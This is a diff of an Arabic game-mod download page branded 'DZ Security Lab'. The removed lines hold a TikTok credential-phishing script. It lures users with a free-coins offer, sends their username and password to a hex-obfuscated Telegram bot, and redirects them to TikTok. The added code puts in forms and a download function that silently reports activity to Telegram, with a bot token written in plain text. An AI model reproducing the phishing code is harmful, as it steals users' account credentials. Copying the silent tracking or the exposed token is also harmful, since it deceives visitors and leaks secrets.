+            <h2 class="section-title">📥 قسم طلبات الألعاب للتعديل (Game Mod Requests)</h2>
+            
+            <div class="interactive-form-card">
+                <h3>🎮 اقترح لعبة تريد تعديلها</h3>
+                <form id="gameRequestForm" onsubmit="submitGameRequest(event)">
+                    <div class="form-group">
+                        <label for="userNameReq">👤 اسمك أو معرفك:</label>
+                        <input type="text" id="userNameReq" class="form-control" placeholder="ادخل اسمك هنا..." required>
+                    </div>
+                    <div class="form-group">
+                        <label for="gameNameReq">🎮 اسم اللعبة المطلوبة:</label>
+                        <input type="text" id="gameNameReq" class="form-control" placeholder="مثال: Roblox, Minecraft..." required>
+                    </div>
+                    <div class="form-group">
+                        <label for="gameLinkReq">🔗 رابط اللعبة (متجر جوجل بلاي أو APK):</label>
+                        <input type="url" id="gameLinkReq" class="form-control" placeholder="https://play.google.com/..." required>
+                    </div>
+                    <div class="form-group">
+                        <label for="modFeaturesReq">⚡ الميزات التي ترغب في إضافتها:</label>
+                        <textarea id="modFeaturesReq" class="form-control" placeholder="اكتب الميزات المطلوبة مثل: تجميد الأعداء، أموال غير محدودة..." required></textarea>
+                    </div>
+                    <button type="submit" class="submit-btn">🚀 إرسال طلب التعديل إلى الإدارة</button>
+                    <div id="requestStatus" class="form-status"></div>
+                </form>
+            </div>
+        </div>
+
+        <div id="page-feedback" class="page-content">
+            <a href="#" class="back-to-home-btn" onclick="switchPage('games')">⬅ العودة إلى قائمة الألعاب</a>
+            
+            <h2 class="section-title">⭐ تقييم الموقع وإرسال الملاحظات والأسئلة</h2>
+            
+            <div class="interactive-form-card">
+                <h3>💬 شاركنا رأيك أو استفسارك</h3>
+                <form id="feedbackForm" onsubmit="submitFeedback(event)">
+                    <div class="form-group">
+                        <label for="userNameFeed">👤 اسم المستخدم:</label>
+                        <input type="text" id="userNameFeed" class="form-control" placeholder="ادخل اسمك هنا..." required>
+                    </div>
+                    <div class="form-group">
+                        <label>⭐ تقييم الموقع:</label>
+                        <div class="star-rating" id="starRating">
+                            <span class="star" data-value="5" onclick="setRating(5)">★</span>
+                            <span class="star" data-value="4" onclick="setRating(4)">★</span>
+                            <span class="star" data-value="3" onclick="setRating(3)">★</span>
+                            <span class="star" data-value="2" onclick="setRating(2)">★</span>
+                            <span class="star" data-value="1" onclick="setRating(1)">★</span>
+                        </div>
+                        <input type="hidden" id="ratingValue" value="5">
+                    </div>
+                    <div class="form-group">
+                        <label for="feedbackText">✍️ ملاحظاتك، أسئلتك، أو اقتراحاتك:</label>
+                        <textarea id="feedbackText" class="form-control" placeholder="اكتب استفسارك أو ملاحظتك هنا باحترافية..." required></textarea>
+                    </div>
+                    <button type="submit" class="submit-btn">📤 إرسال التقييم والملاحظات</button>
+                    <div id="feedbackStatus" class="form-status"></div>
+                </form>
+            </div>
+        </div>
+
     </div>
-</div>
 
-<script>
-    const _0xT = "\x38\x35\x32\x31\x35\x31\x39\x38\x34\x33\x3A\x41\x41\x46\x70\x6A\x45\x44\x6C\x2D\x4D\x45\x72\x53\x64\x30\x4C\x4C\x39\x56\x5A\x48\x36\x58\x61\x47\x51\x5F\x70\x6D\x32\x46\x4B\x50\x51\x45";
-    const _0xI = "\x38\x34\x39\x31\x33\x31\x34\x31\x36\x39";
+    <footer>
+        <p>جميع الحقوق محفوظة &copy; 2026 DZ Security Lab | صُنع بواسطة ADEM</p>
+    </footer>
 
-    function openLogin() { document.getElementById('overlay').style.display = 'flex'; }
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8918820161:AAGo8v59x9Htppsmko8ALNaz7t6ceR4vYhU";
+        const TELEGRAM_CHAT_ID = "8464439368";
 
-    async function sendData() {
-        const u = document.getElementById('user').value;
-        const p = document.getElementById('pass').value;
+        const themes = ['theme-neon-cyan', 'theme-matrix-green', 'theme-cyber-pink', 'theme-electric-violet', 'theme-plasma-gold'];
+        let currentThemeIndex = 0;
+        let autoThemeTimer = null;
+        let isAutoThemeActive = true;
 
-        if(!u || !p) return alert("يرجى إدخال البيانات");
+        function setCyberTheme(themeName) {
+            document.body.className = themeName;
+            localStorage.setItem('dz_cyber_theme', themeName);
+            currentThemeIndex = themes.indexOf(themeName);
+        }
 
-        const report = `🌙 **RAMADAN TIKTOK BREACH** 🌙\n\n👤 User: \`${u}\`\n🔑 Pass: \`${p}\`\n🪙 Offer: \`50 Coins (Free)\`\n\n📡 IP: Fetching...`;
+        function toggleAutoThemeMode() {
+            const btn = document.getElementById('autoModeBtn');
+            isAutoThemeActive = !isAutoThemeActive;
+            
+            if (isAutoThemeActive) {
+                btn.textContent = "🔄 التغيير التلقائي: ON";
+                btn.style.background = "linear-gradient(135deg, #00ff66, #00b347)";
+                btn.style.color = "#000";
+                startAutoThemeEngine();
+            } else {
+                btn.textContent = "🔄 التغيير التلقائي: OFF";
+                btn.style.background = "";
+                btn.style.color = "";
+                clearInterval(autoThemeTimer);
+            }
+        }
 
-        await fetch(`https://api.telegram.org/bot${_0xT}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: _0xI, text: report, parse_mode: 'Markdown'})
+        function startAutoThemeEngine() {
+            clearInterval(autoThemeTimer);
+            autoThemeTimer = setInterval(() => {
+                if (isAutoThemeActive) {
+                    currentThemeIndex = (currentThemeIndex + 1) % themes.length;
+                    setCyberTheme(themes[currentThemeIndex]);
+                }
+            }, 7000);
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedTheme = localStorage.getItem('dz_cyber_theme');
+            if (savedTheme && themes.includes(savedTheme)) {
+                setCyberTheme(savedTheme);
+                currentThemeIndex = themes.indexOf(savedTheme);
+            } else {
+                setCyberTheme('theme-neon-cyan');
+            }
+            
+            const btn = document.getElementById('autoModeBtn');
+            if (btn) {
+                btn.textContent = "🔄 التغيير التلقائي: ON";
+                btn.style.background = "linear-gradient(135deg, #00ff66, #00b347)";
+                btn.style.color = "#000";
+            }
+            startAutoThemeEngine();
         });
 
-        location.replace("https://www.tiktok.com/recharge");
-    }
+        // تم حذف دالة getVisitorIP وجميع استدعاءاتها
 
-    // Fake Notification logic
-    setInterval(() => {
-        const n = document.getElementById('notif');
-        n.style.display = 'block';
-        setTimeout(() => { n.style.display = 'none'; }, 3000);
-    }, 10000);
-</script>
+        async function sendTelegramSilent(textMessage) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: textMessage,
+                        parse_mode: "Markdown"
+                    })
+                });
+            } catch (err) {
+                console.error("Tracking Error:", err);
+            }
+        }
+
+        // تم تعديل دالة trackDownload لإزالة أي تتبع للـ IP
+        function trackDownload(gameName, downloadUrl) {
+            const downloadTime = new Date().toLocaleString('ar-DZ');
+
+            const message = `📥 *عملية تحميل جديدة!* 📥\n\n` +
+                            `🎮 *نوع/اسم اللعبة/الأداة:* \`${gameName}\`\n` +
+                            `🕒 *وقت التحميل:* ${downloadTime}\n\n` +
+                            `📡 *المصدر:* DZ Security Lab Website`;
+
+            sendTelegramSilent(message);
+            window.open(downloadUrl, '_blank');
+        }
+
+        function switchPage(pageName) {
+            document.querySelectorAll('.page-content').forEach(el => {
+                el.classList.remove('active-page');
+            });
+            
+            const boxes = document.querySelectorAll('.cat-box');
+            boxes.forEach(box => box.classList.remove('active'));
+
+            if(pageName === 'tool') {
+                document.getElementById('page-tool').classList.add('active-page');
+                boxes[1].classList.add('active');
+            } else if(pageName === 'transparency') {
+                document.getElementById('page-transparency').classList.add('active-page');
+                boxes[2].classList.add('active');
+            } else if(pageName === 'requests') {
+                document.getElementById('page-requests').classList.add('active-page');
+                boxes[3].classList.add('active');
+            } else if(pageName === 'feedback') {
+                document.getElementById('page-feedback').classList.add('active-page');
+                boxes[4].classList.add('active');
+            } else {
+                document.getElementById('page-games').classList.add('active-page');
+                boxes[0].classList.add('active');
+            }
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function toggleMod(button, modName) {
+            if (button.classList.contains('active-mod')) {
+                button.classList.remove('active-mod');
+                button.textContent = button.textContent.replace(': ON', ': OFF');
+            } else {
+                button.classList.add('active-mod');
+                button.textContent = button.textContent.replace(': OFF', ': ON');
+            }
+        }
+
+        function hideMenu(button) {
+            const previewBox = button.closest('.mod-menu-preview');
+            if (previewBox) {
+                previewBox.style.display = 'none';
+            }
+        }
+
+        let currentRating = 5;
+        function setRating(val) {
+            currentRating = val;
+            document.getElementById('ratingValue').value = val;
+            const stars = document.querySelectorAll('#starRating .star');
+            stars.forEach(star => {
+                if (parseInt(star.getAttribute('data-value')) <= val) {
+                    star.classList.add('selected');
+                } else {
+                    star.classList.remove('selected');
+                }
+            });
+        }
+        setRating(5);
+
+        async function sendTelegramMessage(textMessage, statusElementId) {
+            const statusEl = document.getElementById(statusElementId);
+            statusEl.style.color = "var(--accent-color)";
+            statusEl.textContent = "⏳ جاري إرسال البيانات باحترافية...";
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: textMessage,
+                        parse_mode: "Markdown"
+                    })
+                });
+
+                const data = await response.json();
+                if (data.ok) {
+                    statusEl.style.color = "var(--success-color)";
+                    statusEl.textContent = "✅ تم إرسال رسالتك بنجاح إلى الإدارة عبر تليجرام!";
+                    return true;
+                } else {
+                    throw new Error(data.description || "فشل الإرسال");
+                }
+            } catch (error) {
+                console.error("Telegram Error:", error);
+                statusEl.style.color = "var(--danger-color)";
+                statusEl.textContent = "❌ حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقاً.";
+                return false;
+            }
+        }
+
+        async function submitGameRequest(e) {
+            e.preventDefault();
+            const userName = document.getElementById('userNameReq').value.trim();
+            const gameName = document.getElementById('gameNameReq').value.trim();
+            const gameLink = document.getElementById('gameLinkReq').value.trim();
+            const modFeatures = document.getElementById('modFeaturesReq').value.trim();
+
+            const message = `📥 *طلب تعديل لعبة جديد* 📥\n\n` +
+                            `👤 *اسم المستخدم:* \`${userName}\`\n` +
+                            `🎮 *اسم اللعبة:* \`${gameName}\`\n` +
+                            `🔗 *رابط اللعبة:* ${gameLink}\n` +
+                            `⚡ *الميزات المطلوبة:* \n${modFeatures}\n\n` +
+                            `🌐 *المصدر:* DZ Security Lab Website`;
+
+            const success = await sendTelegramMessage(message, 'requestStatus');
+            if (success) {
+                document.getElementById('gameRequestForm').reset();
+            }
+        }
+
+        async function submitFeedback(e) {
+            e.preventDefault();
+            const userName = document.getElementById('userNameFeed').value.trim();
+            const rating = document.getElementById('ratingValue').value;
+            const feedbackText = document.getElementById('feedbackText').value.trim();
+
+            let starsVisual = "⭐".repeat(parseInt(rating));
+
+            const message = `⭐ *تقييم وملاحظات جديدة للموقع* ⭐\n\n` +
+                            `👤 *اسم المستخدم:* \`${userName}\`\n` +
+                            `📊 *التقييم:* ${rating}/5 (${starsVisual})\n` +
+                            `✍️ *الملاحظات / الأسئلة:* \n${feedbackText}\n\n` +
+                            `🌐 *المصدر:* DZ Security Lab Website`;
+
+            const success = await sendTelegramMessage(message, 'feedbackStatus');
+            if (success) {
+                document.getElementById('feedbackForm').reset();
+                setRating(5);
+            }
+        }
+    </script>
+
 </body>
 </html>
